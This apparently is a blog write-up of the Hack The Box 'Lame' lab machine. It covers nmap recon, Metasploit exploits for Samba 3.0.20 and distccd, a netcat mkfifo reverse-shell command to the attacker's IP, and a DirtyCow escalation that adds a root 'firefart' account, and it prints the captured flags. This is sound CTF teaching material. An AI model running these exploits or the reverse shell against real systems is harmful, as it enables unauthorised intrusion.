---
image: "/assets/img/posts/Manager-3_f1be9242b5.png"
title: "Lame Htb"
description: "Lame is a beginner level machine, which only requires"
pubDate: "2024-04-04"
author: "MrR0807"
categories: ["CTF"]
tags: ["cybersecurity", "writeup"]
pin: false
---
[The Best Academy to Learn Hacking](https://affiliate.hackthebox.com/nenandjabhata).[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1).


## Reconnaissance





To get started,, je lance une petite scan with nmap





  `








```bash


─# nmap $ip                                      


Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-03 05:08 GMT


Host is up (2.3s latency).


Not shown: 65530 filtered tcp ports (no-response)


PORT     STATE SERVICE     VERSION


21/tcp   open  ftp         vsftpd 2.3.4


22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)


139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)


445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)


3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))


Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel





Read data files from: /usr/bin/../share/nmap


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .


Nmap done: 1 IP address (1 host up) scanned in 146.10 seconds


           Raw packets sent: 196673 (8.654MB) | Rcvd: 84 (3.696KB)





Nmap done: 1 IP address (1 host up) scanned in 30.97 seconds





─# nmap -sCV -Pn -p21,22,139,445 $ip                                              


Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-03 05:09 GMT


Nmap scan report for 10.10.10.3


Host is up (0.20s latency).





PORT    STATE SERVICE     VERSION


21/tcp  open  ftp         vsftpd 2.3.4


| ftp-syst: 


|   STAT: 


| FTP server status:


|      Connected to 10.10.14.10


|      Logged in as ftp


|      TYPE: ASCII


|      No session bandwidth limit


|      Session timeout in seconds is 300


|      Control connection is plain text


|      Data connections will be plain text


|      vsFTPd 2.3.4 - secure, fast, stable


|_End of status


|_ftp-anon: Anonymous FTP login allowed (FTP code 230)


22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)


| ssh-hostkey: 


|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)


|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)


139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)


445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)


3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))


Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel





Host script results:


|_clock-skew: mean: -4h00m27s, deviation: 2h49m45s, median: -6h00m29s


| smb-os-discovery: 


|   OS: Unix (Samba 3.0.20-Debian)


|   Computer name: lame


|   NetBIOS computer name: 


|   Domain name: hackthebox.gr


|   FQDN: lame.hackthebox.gr


|_  System time: 2024-04-02T19:09:20-04:00


| smb-security-mode: 


|   account_used: guest


|   authentication_level: user


|   challenge_response: supported


|_  message_signing: disabled (dangerous, but default)


|_smb2-time: Protocol negotiation failed (SMB2)





```


`


### Petite Analyse





Here I find 5 ports open on the machine, including:





FTP open on port 21, but nothing interesting insideSSH open on port 22, with an OpenSSH version 4.7SMB open on ports (139/445) with a Smbd version 3.0.20Distcc open on the last port which is 3632





To get started, my recognition on these ports, I start with the SMB which covers an old version of Samba with the enum4linux tool





  `








```bash


─# enum4linux -a 10.10.10.3


Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Apr  3 05:15:19 2024





 =========================================( Target Information )=========================================





Target ........... 10.10.10.3


RID Range ........ 500-550,1000-1050


Username ......... 


Password ......... 


Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


[+] Got OS info for 10.10.10.3 from srvinfo:                                                                                                                                                 


        LAME           Wk Sv PrQ Unx NT SNT lame server (Samba 3.0.20-Debian)                                                                                                                


        platform_id     :       500


        os version      :       4.9


        server type     :       0x9a03





```


`





So from here, I can do some research on the Samba 3.0.20 version that I just found.





[![Searchsploit](/assets/img/posts/sploit_e45e6c5b18.png)](https://i.ibb.co/hHzKFYG/sploit.png)





## 1er Exploitation





I find an exploit called Username map script Command Execution (Metasploit) already available on Metasploit that I can use to exploit it





  `








```bash


msf6 > search Samba 3.0.20





Matching Modules


================





   #  Name                                Disclosure Date  Rank       Check  Description


   -  ----                                ---------------  ----       -----  -----------


   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution





Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script





msf6 > use 0


[*] No payload configured, defaulting to cmd/unix/reverse_netcat


msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3


rhosts => 10.10.10.3


msf6 exploit(multi/samba/usermap_script) > set lhost tun0


lhost => 10.10.14.10


msf6 exploit(multi/samba/usermap_script) > run





[*] Started reverse TCP handler on 10.10.14.10:4444 


[*] Command shell session 1 opened (10.10.14.10:4444 -> 10.10.10.3:57687) at 2024-04-03 19:38:03 +0000





id


uid=0(root) gid=0(root)


python -c import pty; pty.spawn("/bin/bash")


root@lame:/root# cat root.txt


cat root.txt


92caac3be140ef409e45721348a4e9df





```


`





Voila, we have just rooted the Box with the first method.





## 2eme Methode





For a more in-depth look at the exploitation of the Box, I was able to note that the last port 3632 was also vulnerable to a Daemon Command Execution. First I will look for a scanner of this port with nmap





  `








```bash


─# ls /usr/share/nmap/scripts | grep "distcc" 


distcc-cve2004-2687.nse





```


`





[![Vulnerable](/assets/img/posts/l3_f53f744085.png)](https://i.ibb.co/M2NZwNq/l3.png)





The exploit confirms that it is vulnerable, so I will also use Metasploit to exploit this protocol





  `








```bash


msf6 > search distcc





Matching Modules


================





   #  Name                           Disclosure Date  Rank       Check  Description


   -  ----                           ---------------  ----       -----  -----------


   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution





Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/misc/distcc_exec





msf6 > use 0


[*] No payload configured, defaulting to cmd/unix/reverse_bash


msf6 exploit(unix/misc/distcc_exec) > set lhost tun0 


lhost => 10.10.14.10


msf6 exploit(unix/misc/distcc_exec) > set lport 1337


lport => 1337


msf6 exploit(unix/misc/distcc_exec) > set rhosts 10.10.10.3


msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/generic 


payload => cmd/unix/generic


msf6 exploit(unix/misc/distcc_exec) > set cmd id


cmd => id


msf6 exploit(unix/misc/distcc_exec) > run





[*] 10.10.10.3:3632 - stdout: uid=1(daemon) gid=1(daemon) groups=1(daemon)


[*] Exploit completed, but no session was created.


msf6 exploit(unix/misc/distcc_exec) >





```


`





Here, I use the cmd/unix/generic payload which will allow me to execute specific commands, as we can clearly see in set cmd id where I specify my command which will be an id of the user. and which gives me a result uid=1(daemon) gid=1(daemon) groups=1(daemon)





So Now, I'm going to put a payload to get a shell on the machine.





  `








```bash


msf6 exploit(unix/misc/distcc_exec) > set cmd rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.10 1338 >/tmp/f


cmd => rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.10 1338 >/tmp/f


Payload options (cmd/unix/generic):





   Name  Current Setting                            Required  Description


   ----  ---------------                            --------  -----------


   CMD   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -  yes       The command string to execute


         i 2>&1|nc 10.10.14.10 1338 >/tmp/f





Exploit target:





   Id  Name


   --  ----


   0   Automatic Target





View the full module info with the info, or info -d command.





msf6 exploit(unix/misc/distcc_exec) > run





[*] 10.10.10.3:3632 - The remote distccd did not reply to our request


[*] Exploit completed, but no session was created.


msf6 exploit(unix/misc/distcc_exec) >





```


`





In my listener, I receive the connection from the remote machine. Finally, I read the user.txt file.





  `








```bash


# sudo rlwrap nc -lnvp 1338                    


listening on [any] 1338 ...


connect to [10.10.14.10] from (UNKNOWN) [10.10.10.3] 37374


bash: no job control in this shell


daemon@lame:/tmp$ whoami


daemon


daemon@lame:/home$ cd makis


daemon@lame:/home/makis$ ls


user.txt


daemon@lame:/home/makis$ cat *


69454a937d94f5f0225ea00acd2e84c5





```


`


## Privilege Escalation





For Privilege scaling, I run linpeas.sh on the machine and it detects that this machine is vulnerable to DirtyCow (CVE-2016-5195)





  `








```bash


[3] dirty_cow


      CVE-2016-5195


      Source: http://www.exploit-db.com/exploits/40616





```


`





I will then copy the exploit to the machine, Next, compile it with: gcc dirtycow.c -o dirty -pthread and then execute it





  `








```bash


I have no name!@lame:/tmp$ ./dirty root


/etc/passwd successfully backed up to /tmp/passwd.bak


Please enter the new password: root


Complete line:


firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash





mmap: b7f4b000


ptrace 0


Done! Check /etc/passwd to see if the new user was created.


You can log in with the username firefart and the password root.





DONT FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd


/etc/passwd successfully backed up to /tmp/passwd.bak


Please enter the new password: root


Complete line:


firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash





mmap: b7f4b000


madvise 0





Done! Check /etc/passwd to see if the new user was created.


You can log in with the username firefart and the password root.





DONT FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd





```


`





The exploit worked well and it created a firefart user with all root privileges and also with my root password. So I didn't manage to connect via ssh with this user and the password





  `








```bash


└─# ssh firefart@10.10.10.3


The authenticity of host 10.10.10.3 (10.10.10.3) cant be established.


RSA key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.


This key is not known by any other names.


Are you sure you want to continue connecting (yes/no/[fingerprint])? yes


Warning: Permanently added 10.10.10.3 (RSA) to the list of known hosts.


firefart@10.10.10.3s password: 


Last login: Thu Mar  7 22:23:04 2024 from :0.0


Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686





The programs included with the Ubuntu system are free software;


the exact distribution terms for each program are described in the


individual files in /usr/share/doc/*/copyright.





Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by


applicable law.





To access official Ubuntu documentation, please visit:


http://help.ubuntu.com/


firefart@lame:~# id


uid=0(firefart) gid=0(root) groups=0(root)


firefart@lame:~# cat /root/root.txt


92caac3be140ef409e45721348a4e9df


firefart@lame:~#





```


`


## Ressources supplementaires





Here are some additional resources that you might find helpful: [DistCC Pentesting](https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc) [DirtyCow Hacking](https://www.hackingarticles.in/hack-linux-kernel-using-dirtycow-exploit-privilege-escalation/) [DirtyCow ExploitDB](https://www.exploit-db.com/exploits/40616)





[Join Us on Discord](https://discord.gg/wBT9wr9ruG). Share        [](https://twitter.com/intent/tweet?text=Lame%20-%20HacktheBox%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Flame-htb%2F)       [](https://www.facebook.com/sharer/sharer.php?title=Lame%20-%20HacktheBox%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&u=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Flame-htb%2F)       [](https://t.me/share/url?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Flame-htb%2F&text=Lame%20-%20HacktheBox%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE)       [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Flame-htb%2F)


